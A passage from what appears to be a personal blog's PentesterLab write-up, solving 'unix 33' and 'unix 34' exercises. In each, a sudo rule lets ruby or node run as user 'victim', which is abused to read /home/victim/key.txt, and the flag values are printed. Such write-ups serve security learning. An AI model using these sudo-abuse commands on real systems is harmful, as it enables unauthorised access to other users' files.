</span></span><span style=display:flex><span>d134df68-e979-48a0-aa09-3ff6399c12b9
</span></span></code></pre></div><h2 id=unix-33>unix 33
<a class=heading-link href=#unix-33><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># pentesterlab</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@e58cec392d20:~$ sudo -l
</span></span><span style=display:flex><span>    (victim) /usr/bin/ruby
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@e58cec392d20:~$ sudo -u victim /usr/bin/ruby -e <span style=color:#0086d2>&#39;system(&#34;cat /home/victim/key.txt&#34;)&#39;</span>
</span></span><span style=display:flex><span>e4c59ad6-4be7-4bb1-934d-4d087084bed0
</span></span></code></pre></div><h2 id=unix-34>unix 34
<a class=heading-link href=#unix-34><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>pentesterlab@2be6350f89b8:~$ sudo -l
</span></span><span style=display:flex><span>    (victim) /usr/local/bin/node
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pentesterlab@2be6350f89b8:/tmp/baz$ sudo -u victim /usr/local/bin/node -e <span style=color:#0086d2>&#39;var exec = require(&#34;child_process&#34;).exec; exec(&#34;cat 
</span></span></span><span style=display:flex><span><span style=color:#0086d2>/home/victim/key.txt&#34;, function (error, stdOut, stdErr) { console.log(stdOut); });&#39;</span>
</span></span><span style=display:flex><span>43ee9b19-e6f2-4cfc-89cd-ce54dd148aff
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>